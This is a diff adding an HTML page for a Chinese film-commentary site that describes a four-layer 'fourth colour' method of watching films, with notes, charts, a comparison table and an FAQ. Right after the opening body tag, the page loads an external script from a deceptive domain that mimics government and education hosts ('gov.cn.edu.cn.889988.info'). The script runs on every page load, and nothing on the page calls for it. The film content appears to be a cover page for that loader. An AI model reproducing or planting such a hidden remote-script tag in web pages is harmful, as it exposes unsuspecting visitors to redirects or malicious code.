@@ -1,0 +1,566 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>米奇影视第四色 · 用四种颜色把一部片子看四遍</title>
+<meta name="description" content="米奇影视第四色是一份关于观影视角的长期笔记。我们不讨论演员八卦，也不搬运评分，只把一部片子拆成第四色、第三色、第二色、第一色四层来看：先说最直观的感受，再谈声音与节奏，然后看构图和镜头，最后回到那件被藏起来的事。这里记录老片重看、冷门片补看、动画片与真人片的对照，也记录看完之后那句说不出口的话。">
+<meta name="keywords" content="米奇影视第四色,第四色观影法,四层看电影,先说感受再看镜头,声音与节奏分析,构图和色彩解读,老片重看笔记,冷门片补看清单,动画片真人片对照,看完之后想不通,电影细节复盘,影评笔记怎么写,非专业观影记录,一个人看电影,反复看的电影">
+<link rel="canonical" href="https://miqiyingshidisise-top.github.io">
+<meta name="theme-color" content="#f4efe6">
+<style>
+:root{
+  --paper:#f4efe6;
+  --paper2:#ece4d5;
+  --ink:#1d1a16;
+  --ink2:#4a4238;
+  --fade:#8a7f70;
+  --line:#c9bda8;
+  --c1:#e0483c;
+  --c2:#2f7d8c;
+  --c3:#c8932f;
+  --c4:#4a5c2f;
+}
+*{box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  margin:0;
+  background:var(--paper);
+  color:var(--ink);
+  font-family:"Songti SC","SimSun","Source Han Serif SC",Georgia,"Times New Roman",serif;
+  line-height:1.85;
+  font-size:16px;
+}
+img{max-width:100%;display:block;}
+a{color:inherit;text-decoration:none;}
+
+/* ===== 顶栏 ===== */
+.topbar{
+  position:sticky;top:0;z-index:50;
+  background:rgba(244,239,230,.94);
+  backdrop-filter:blur(6px);
+  border-bottom:3px double var(--ink);
+}
+.topbar-in{max-width:1180px;margin:0 auto;padding:10px 20px;display:flex;align-items:center;gap:18px;}
+.brandmark{font-size:19px;font-weight:800;letter-spacing:1px;white-space:nowrap;}
+.brandmark em{font-style:normal;color:var(--c1);}
+.topnav{display:flex;gap:4px;flex-wrap:wrap;margin-left:auto;}
+.topnav a{
+  font-size:13.5px;padding:5px 11px;border:1px solid transparent;
+  font-family:"Helvetica Neue",Arial,sans-serif;
+}
+.topnav a:hover{border-color:var(--ink);background:#fff;}
+.menu-btn{
+  display:none;background:none;border:1px solid var(--ink);
+  font:inherit;font-size:13px;padding:6px 12px;cursor:pointer;margin-left:auto;
+}
+
+/* ===== 报头 ===== */
+.masthead{max-width:1180px;margin:0 auto;padding:46px 20px 26px;}
+.masthead-top{display:flex;justify-content:space-between;align-items:flex-end;gap:20px;flex-wrap:wrap;}
+.kicker{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;letter-spacing:.28em;
+  color:var(--fade);text-transform:uppercase;
+}
+.masthead h1{
+  font-size:clamp(40px,7vw,84px);
+  line-height:1.02;margin:14px 0 6px;font-weight:800;letter-spacing:-1px;
+}
+.masthead h1 span{color:var(--c1);}
+.subline{font-size:clamp(15px,2.4vw,19px);color:var(--ink2);margin:0;}
+.masthead-meta{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;color:var(--fade);
+  text-align:right;line-height:1.9;
+}
+.masthead-bottom{
+  margin-top:26px;border-top:1px solid var(--ink);border-bottom:3px double var(--ink);
+  padding:12px 0;display:flex;gap:14px;flex-wrap:wrap;
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:12.5px;color:var(--ink2);
+}
+.masthead-bottom b{color:var(--c1);font-weight:700;}
+
+/* ===== 通用区块 ===== */
+section{padding:52px 0;border-bottom:1px solid var(--line);}
+.wrap{max-width:1180px;margin:0 auto;padding:0 20px;}
+.sec-head{display:flex;align-items:baseline;gap:14px;flex-wrap:wrap;margin-bottom:8px;}
+.sec-num{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;letter-spacing:.2em;
+  color:#fff;background:var(--ink);padding:4px 10px;
+}
+.sec-head h2{font-size:clamp(24px,4vw,34px);margin:0;font-weight:800;}
+.sec-note{color:var(--fade);font-size:14px;margin:0 0 30px;max-width:62ch;}
+
+/* ===== 四色楼梯 ===== */
+.ladder{display:grid;grid-template-columns:repeat(4,1fr);gap:0;border:1px solid var(--ink);}
+.ladder>div{padding:26px 20px 30px;border-right:1px solid var(--ink);background:var(--paper);}
+.ladder>div:last-child{border-right:none;}
+.ladder .swatch{width:46px;height:46px;border:1px solid rgba(0,0,0,.18);margin-bottom:16px;}
+.ladder h3{margin:0 0 4px;font-size:21px;}
+.ladder .ord{font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;letter-spacing:.18em;color:var(--fade);}
+.ladder p{margin:14px 0 0;font-size:14.5px;color:var(--ink2);}
+.ladder .tags{margin-top:16px;display:flex;flex-wrap:wrap;gap:6px;}
+.ladder .tags i{
+  font-style:normal;font-family:"Helvetica Neue",Arial,sans-serif;font-size:11.5px;
+  border:1px solid var(--line);padding:3px 8px;color:var(--ink2);
+}
+
+/* ===== 笔记条目 ===== */
+.notes{display:grid;grid-template-columns:repeat(2,1fr);gap:26px;}
+.note{
+  border-top:2px solid var(--ink);padding-top:16px;
+  display:grid;grid-template-columns:74px 1fr;gap:16px;
+}
+.note .idx{font-family:Georgia,serif;font-size:30px;font-weight:700;line-height:1.1;}
+.note h3{margin:0 0 6px;font-size:19px;}
+.note .meta{
+  font-family:"Helvetica Neue",Arial,sans-serif;font-size:11.5px;letter-spacing:.06em;
+  color:var(--fade);margin-bottom:10px;
+}
+.note p{margin:0;font-size:14.5px;color:var(--ink2);}
+.note .quote{
+  margin-top:12px;padding:10px 12px;background:var(--paper2);font-size:14px;
+  border-left:3px solid var(--c3);
+}
+
+/* ===== 进度条 ===== */
+.bars{display:grid;grid-template-columns:repeat(2,1fr);gap:20px 40px;}
+.bar-row .top{display:flex;justify-content:space-between;font-size:13.5px;margin-bottom:5px;}
+.bar-row .top b{font-weight:700;}
+.bar-track{height:9px;background:var(--paper2);border:1px solid var(--line);}
+.bar-fill{height:100%;background:var(--ink);}
+
+/* ===== 对照表 ===== */
+.tablewrap{overflow-x:auto;border:1px solid var(--ink);}
+table{width:100%;border-collapse:collapse;font-size:14px;min-width:640px;}
+th,td{padding:13px 14px;text-align:left;border-bottom:1px solid var(--line);vertical-align:top;}
+thead th{background:var(--ink);color:#fff;font-family:"Helvetica Neue",Arial,sans-serif;font-size:12px;letter-spacing:.1em;font-weight:600;}
+tbody tr:nth-child(even){background:rgba(0,0,0,.025);}
+td .yr{font-family:Georgia,serif;color:var(--fade);font-size:13px;}
+
+/* ===== 问答 ===== */
+.qa{border-top:1px solid var(--ink);}
+.qa details{padding:16px 0;border-bottom:1px dashed var(--line);}
+.qa summary{cursor:pointer;font-weight:700;font-size:16px;list-style:none;display:flex;gap:12px;align-items:baseline;}
+.qa summary::-webkit-details-marker{display:none;}
+.qa summary::before{
+  content:"问";flex:none;font-family:"Helvetica Neue",Arial,sans-serif;font-size:11px;
+  background:var(--c1);color:#fff;padding:2px 7px;
+}
+.qa details[open] summary::before{content:"答";background:var(--ink);}
+.qa p{margin:12px 0 0;font-size:14.5px;color:var(--ink2);padding-left:40px;}
+
+/* ===== 关于 ===== */
+.about-grid{display:grid;grid-template-columns:1.4fr 1fr;gap:40px;}
+.about-grid h3{margin:0 0 12px;font-size:22px;}
+.about-grid p{margin:0 0 14px;font-size:15px;color:var(--ink2);}
+.urlbox{
+  border:2px dashed var(--c1);padding:20px;background:#fff;
+  font-family:"Helvetica Neue",Arial,sans-serif;
+}
+.urlbox .lab{font-size:11px;letter-spacing:.22em;color:var(--fade);}
+.urlbox .val{font-size:15px;word-break:break-all;margin-top:8px;font-weight:700;}
+.urlbox p{font-size:13px;color:var(--fade);margin:12px 0 0;font-family:inherit;}
+
+/* ===== 页脚 ===== */
+footer{border-top:3px double var(--ink);padding:30px 0 44px;margin-top:0;}
+.foot{max-width:1180px;margin:0 auto;padding:0 20px;display:flex;justify-content:space-between;gap:20px;flex-wrap:wrap;}
+.foot p{margin:0;font-size:12.5px;color:var(--fade);font-family:"Helvetica Neue",Arial,sans-serif;}
+#top{position:fixed;right:18px;bottom:22px;z-index:60;width:46px;height:46px;
+  border:1px solid var(--ink);background:var(--paper);font:inherit;font-size:17px;cursor:pointer;
+  opacity:0;pointer-events:none;transition:.25s;}
+#top.show{opacity:1;pointer-events:auto;}
+
+@media (max-width:900px){
+  .ladder{grid-template-columns:repeat(2,1fr);}
+  .ladder>div:nth-child(2){border-right:none;}
+  .ladder>div:nth-child(1),.ladder>div:nth-child(2){border-bottom:1px solid var(--ink);}
+  .notes,.bars{grid-template-columns:1fr;}
+}
+@media (max-width:640px){
+  .topnav{display:none;position:fixed;inset:0;background:var(--paper);z-index:49;
+    flex-direction:column;padding:90px 26px 40px;gap:2px;}
+  .topnav.open{display:flex;}
+  .topnav a{border:1px solid var(--line);padding:15px 16px;font-size:16px;}
+  .menu-btn{display:block;}
+  .ladder{grid-template-columns:1fr;}
+  .ladder>div{border-right:none;border-bottom:1px solid var(--ink);}
+  .ladder>div:last-child{border-bottom:none;}
+  .masthead-meta{text-align:left;}
+  .note{grid-template-columns:1fr;}
+  .note .idx{font-size:22px;}
+  .about-grid{grid-template-columns:1fr;}
+  #top{right:12px;bottom:16px;width:42px;height:42px;font-size:15px;}
+}
+@media print{
+  .topbar,#top,.menu-btn{display:none;}
+  body{background:#fff;font-size:11pt;}
+  section{page-break-inside:avoid;}
+  .note,.qa details{break-inside:avoid;}
+  a{color:#000;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/changyuan.js"></script>
+
+<header class="topbar">
+  <div class="topbar-in">
+    <div class="brandmark">米奇影视<em>·</em>第四色</div>
+    <button class="menu-btn" id="mb" aria-label="打开导航">目录</button>
+    <nav class="topnav" id="tn">
+      <a href="#s1">四色方法</a>
+      <a href="#s2">近期笔记</a>
+      <a href="#s3">四色分布</a>
+      <a href="#s4">类型对照</a>
+      <a href="#s5">常见疑问</a>
+      <a href="#s6">关于本站</a>
+    </nav>
+  </div>
+</header>
+
+<div class="masthead">
+  <div class="masthead-top">
+    <div>
+      <div class="kicker">A Notebook on Looking Closely</div>
+      <h1>米奇影视<span>第四色</span></h1>
+      <p class="subline">同一部片子，四个人看会说出四件不同的事。我们把这四件事排成顺序，从最表面的那件开始。</p>
+    </div>
+    <div class="masthead-meta">
+      第四版方法 · 修订于 2026 年秋<br>
+      累计笔记 412 篇 · 其中已归档 268 篇<br>
+      更新频率：每周二、周五
+    </div>
+  </div>
+  <div class="masthead-bottom">
+    <span><b>第一色</b> 最直观的感受</span>
+    <span><b>第二色</b> 声音与节奏</span>
+    <span><b>第三色</b> 构图与镜头</span>
+    <span><b>第四色</b> 被藏起来的那件事</span>
+  </div>
+</div>
+
+<section id="s1">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 01</span>
+      <h2>四色方法</h2>
+    </div>
+    <p class="sec-note">四色不是四种评价，而是四个先后。顺序不能颠倒：先承认自己的感受，才有资格谈后面的三层。</p>
+
+    <div class="ladder">
+      <div>
+        <div class="swatch" style="background:var(--c1);"></div>
+        <div class="ord">THE FIRST COLOUR</div>
+        <h3>第一色 · 感受</h3>
+        <p>只看一遍，立刻写下身体反应：哪里松了口气，哪里坐直了，哪里想快进。不许用「好看」「难看」这类词，只写发生了什么。</p>
+        <div class="tags"><i>第一遍看</i><i>身体反应</i><i>不做判断</i></div>
+      </div>
+      <div>
+        <div class="swatch" style="background:var(--c2);"></div>
+        <div class="ord">THE SECOND COLOUR</div>
+        <h3>第二色 · 声音</h3>
+        <p>关掉画面只听声音再看一遍。台词停在哪句之后，音乐从哪里进来，沉默持续了几秒。节奏是剪出来的，不是演出来的。</p>
+        <div class="tags"><i>声音先行</i><i>台词停顿</i><i>音乐入口</i></div>
+      </div>
+      <div>
+        <div class="swatch" style="background:var(--c3);"></div>
+        <div class="ord">THE THIRD COLOUR</div>
+        <h3>第三色 · 构图</h3>
+        <p>截图，把所有画面摊开看。谁在画面左边，门框切掉了什么，颜色在哪一分钟变了。镜头不会说谎，但它会省略。</p>
+        <div class="tags"><i>截图对比</i><i>人物位置</i><i>色彩变化</i></div>
+      </div>
+      <div>
+        <div class="swatch" style="background:var(--c4);"></div>
+        <div class="ord">THE FOURTH COLOUR</div>
+        <h3>第四色 · 那件事</h3>
+        <p>前三层都写完，再问一句：这片子真正在讲的事，有没有被任何人说出口？多数时候，答案是没有。那才是第四色。</p>
+        <div class="tags"><i>未被说出的</i><i>结尾回看</i><i>留白处</i></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="s2">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 02</span>
+      <h2>近期笔记</h2>
+    </div>
+    <p class="sec-note">最近六篇。每篇只做一件事：把某一层的某一个小地方讲清楚，不写通篇评论。</p>
+
+    <div class="notes">
+      <article class="note">
+        <div class="idx">01</div>
+        <div>
+          <h3>厨房里的三秒钟</h3>
+          <div class="meta">2026.10.14 · 第一色 · 家庭伦理</div>
+          <p>全片最安静的一场戏发生在厨房，两个人没有对视。真正让人坐不住的不是对话内容，而是其中一个人一直在擦已经干净的台面。</p>
+          <p class="quote">「有些紧张是用多余的劳动表现出来的。」</p>
+        </div>
+      </article>
+      <article class="note">
+        <div class="idx">02</div>
+        <div>
+          <h3>雨声是从第几分钟进来的</h3>
+          <div class="meta">2026.10.11 · 第二色 · 悬疑</div>
+          <p>前四十分钟几乎没有环境音，雨声第一次出现时，画面里并没有下雨。这个错位持续了七分钟，直到窗外真的亮起来。</p>
+          <p class="quote">「声音比画面早一步承认了真相。」</p>
+        </div>
+      </article>
+      <article class="note">
+        <div class="idx">03</div>
+        <div>
+          <h3>门框切掉了谁的半张脸</h3>
+          <div class="meta">2026.10.07 · 第三色 · 老片重看</div>
+          <p>同一场对话，正反打用了两种不同的取景。一方的镜头里门框完整，另一方总是被切掉一侧。这不是疏忽，是立场。</p>
+          <p class="quote">「构图是一种长期的态度，不是一时的漂亮。」</p>
+        </div>
+      </article>
+      <article class="note">
+        <div class="idx">04</div>
+        <div>
+          <h3>结尾那句话，其实开头说过</h3>
+          <div class="meta">2026.10.04 · 第四色 · 剧情</div>
+          <p>把片头字幕前的对白和最后一句对白放在一起读，会发现中间所有情节都只是一次验证。第四色藏在第一格画面里。</p>
+          <p class="quote">「好片子不给你新信息，只让你重新听旧信息。」</p>
+        </div>
+      </article>
+      <article class="note">
+        <div class="idx">05</div>
+        <div>
+          <h3>动画里的空镜不是空镜</h3>
+          <div class="meta">2026.09.30 · 第三色 · 动画</div>
+          <p>三秒的云、五秒的街道、两次重复出现的电线杆。这些镜头承担了全部情绪转折，因为它们是唯一允许观众喘息的地方。</p>
+          <p class="quote">「动画的留白是画出来的，所以比实拍更贵。」</p>
+        </div>
+      </article>
+      <article class="note">
+        <div class="idx">06</div>
+        <div>
+          <h3>冷门片补看：一张碟的代价</h3>
+          <div class="meta">2026.09.26 · 第一色 · 冷门片</div>
+          <p>这部片子在主流榜单上找不到名字，但它用最朴素的方式解决了一个很难的问题：一个人怎么知道自己被爱过。</p>
+          <p class="quote">「冷门不等于被错过，有时只是还没轮到。」</p>
+        </div>
+      </article>
+    </div>
+  </div>
+</section>
+
+<section id="s3">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 03</span>
+      <h2>四色分布</h2>
+    </div>
+    <p class="sec-note">已归档的 268 篇笔记里，各层所占篇幅。数字不是结论，只是提醒我们哪一层的练习还不够。</p>
+
+    <div class="bars">
+      <div class="bar-row">
+        <div class="top"><span>第一色 · 感受</span><b>34%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:34%;background:var(--c1);"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>第二色 · 声音与节奏</span><b>21%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:21%;background:var(--c2);"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>第三色 · 构图与镜头</span><b>27%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:27%;background:var(--c3);"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>第四色 · 被藏起来的事</span><b>18%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:18%;background:var(--c4);"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>需要重看两遍以上</span><b>63%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:63%;"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>写完仍有疑问</span><b>41%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:41%;"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>动画与真人对照</span><b>15%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:15%;"></div></div>
+      </div>
+      <div class="bar-row">
+        <div class="top"><span>隔年回头修改过的</span><b>29%</b></div>
+        <div class="bar-track"><div class="bar-fill" style="width:29%;"></div></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<section id="s4">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 04</span>
+      <h2>类型对照</h2>
+    </div>
+    <p class="sec-note">同一种手法在不同类型里的意思常常相反。这张表是我们自己的速查，不打算给出标准答案。</p>
+
+    <div class="tablewrap">
+      <table>
+        <thead>
+          <tr>
+            <th style="width:15%;">手法</th>
+            <th style="width:21%;">在剧情片里</th>
+            <th style="width:21%;">在悬疑片里</th>
+            <th style="width:21%;">在动画片里</th>
+            <th style="width:22%;">第四色通常落在</th>
+          </tr>
+        </thead>
+        <tbody>
+          <tr>
+            <td>长镜头 <span class="yr">Long Take</span></td>
+            <td>让人承认时间过去了</td>
+            <td>让观众来不及喘气</td>
+            <td>让幻想显得可信</td>
+            <td>谁在被观察</td>
+          </tr>
+          <tr>
+            <td>空镜 <span class="yr">Empty Shot</span></td>
+            <td>情绪之后的余震</td>
+            <td>线索或倒计时</td>
+            <td>世界观的自述</td>
+            <td>被省略的那段</td>
+          </tr>
+          <tr>
+            <td>静止画面 <span class="yr">Freeze</span></td>
+            <td>记忆定格</td>
+            <td>真相已暴露</td>
+            <td>情绪达到顶点</td>
+            <td>为什么停在这里</td>
+          </tr>
+          <tr>
+            <td>环境音 <span class="yr">Ambience</span></td>
+            <td>交代关系亲疏</td>
+            <td>制造误判</td>
+            <td>建立可信空间</td>
+            <td>声音先于画面说了什么</td>
+          </tr>
+          <tr>
+            <td>冷暖对比 <span class="yr">Colour</span></td>
+            <td>两个人之间有无隔阂</td>
+            <td>哪条线是真的</td>
+            <td>心情的外化</td>
+            <td>颜色变化发生在哪一分钟</td>
+          </tr>
+          <tr>
+            <td>重复台词 <span class="yr">Repeat</span></td>
+            <td>关系已经发生转变</td>
+            <td>同一事件不同版本</td>
+            <td>主题变奏</td>
+            <td>第二次说时谁变了</td>
+          </tr>
+          <tr>
+            <td>开放式结尾 <span class="yr">Open End</span></td>
+            <td>生活本来如此</td>
+            <td>留下一条线索</td>
+            <td>邀请观众参与</td>
+            <td>结尾之前那十秒</td>
+          </tr>
+          <tr>
+            <td>画幅变化 <span class="yr">Aspect</span></td>
+            <td>记忆与现实的分界</td>
+            <td>视角的切换</td>
+            <td>次元的暗示</td>
+            <td>变回原画幅的时机</td>
+          </tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+</section>
+
+<section id="s5">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 05</span>
+      <h2>常见疑问</h2>
+    </div>
+    <p class="sec-note">这些问题被问得最多，回答也都写在这里，不再重复解释。</p>
+
+    <div class="qa">
+      <details open>
+        <summary>为什么叫第四色，第四种颜色是什么？</summary>
+        <p>没有第四种物理颜色。前三层是观众自己能看见的：感受、声音、构图。第四层是观众原本看不见、写完笔记才意识到一直在那里的那件事。它之所以叫色，是因为它像颜色一样，必须先有底色才能被辨认。</p>
+      </details>
+      <details>
+        <summary>一定要按一、二、三、四的顺序看吗？</summary>
+        <p>对。跳过第一层直接谈镜头，写出来的东西会很聪明但不可信。反过来先写第四层，往往只是把自己的心事安在了片子上。顺序是一种纪律，不是仪式。</p>
+      </details>
+      <details>
+        <summary>每部片子都要写满四层吗？</summary>
+        <p>不用。大多数片子只有一层值得写，那就只写那一层。写满四层反而是在凑字数。我们归档的笔记里，单层的占六成以上。</p>
+      </details>
+      <details>
+        <summary>动画片和真人片用同一套方法吗？</summary>
+        <p>方法一样，但第三层要更小心。动画的每一个像素都是选择，真人片的构图还受现场条件限制。所以在动画里，构图那一层的信息量通常大得多，也更费时间。</p>
+      </details>
+      <details>
+        <summary>冷门片是怎么选出来的？</summary>
+        <p>没有评选。只是某天在某个地方看到，看完觉得必须写下来。榜单、评分、票房都不参与选择，年份也不参与。所以这里的冷门片名单会显得很散。</p>
+      </details>
+      <details>
+        <summary>写这些对普通观影有什么用？</summary>
+        <p>最大的用处是让第二次看一部片子变得值得。第一次看是经历，第二次看是理解，第四次看是认识自己。不需要写笔记也能获得这个，只是慢一些。</p>
+      </details>
+    </div>
+  </div>
+</section>
+
+<section id="s6">
+  <div class="wrap">
+    <div class="sec-head">
+      <span class="sec-num">SECTION 06</span>
+      <h2>关于本站</h2>
+    </div>
+
+    <div class="about-grid">
+      <div>
+        <h3>这份笔记从哪里来</h3>
+        <p>米奇影视第四色开始于一次很私人的挫败：看完一部片子，心里很满，嘴里却说不出任何一句像样的话。于是我们试着把「说不出」这件事拆开，拆到能落笔为止。四色就是这么拆出来的。</p>
+        <p>这里不搬运评分，不讨论演员八卦，不比较平台优劣，也不追赶上映档期。我们只记录一件小事：一部片子在什么地方，让什么人，产生了什么反应。写下来的东西隔年常常会被自己推翻，那就再改一次。</p>
+        <p>如果你也常常看完之后说不出话，或者说了太多话却觉得都不对，这里的笔记也许能派上用场。你不需要认同任何一篇，只需要找到自己那一层。</p>
+      </div>
+      <aside class="urlbox">
+        <div class="lab">本站地址 / CANONICAL</div>
+        <div class="val">https://miqiyingshidisise-top.github.io</div>
+        <p>所有笔记以这里收录的版本为准。转载与引用请保留出处，修改过的旧版本不会在这里更新。</p>
+      </aside>
+    </div>
+  </div>
+</section>
+
+<footer>
+  <div class="foot">
+    <p>米奇影视第四色 · 一份关于观影视角的长期笔记</p>
+    <p>© 2026 米奇影视第四色 · 更新于 2026 年 10 月</p>
+  </div>
+</footer>
+
+<button id="top" aria-label="回到顶部">↑</button>
+
+<script>
+(function(){
+  var mb=document.getElementById('mb'),tn=document.getElementById('tn');
+  mb.addEventListener('click',function(){
+    tn.classList.toggle('open');
+    mb.textContent=tn.classList.contains('open')?'关闭':'目录';
+  });
+  tn.addEventListener('click',function(e){
+    if(e.target.tagName==='A'){tn.classList.remove('open');mb.textContent='目录';}
+  });
+
+  var top=document.getElementById('top');
+  window.addEventListener('scroll',function(){
+    top.classList[window.scrollY>700?'add':'remove']('show');
+  });
+  top.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+})();
+</script>
+</body>
+</html>
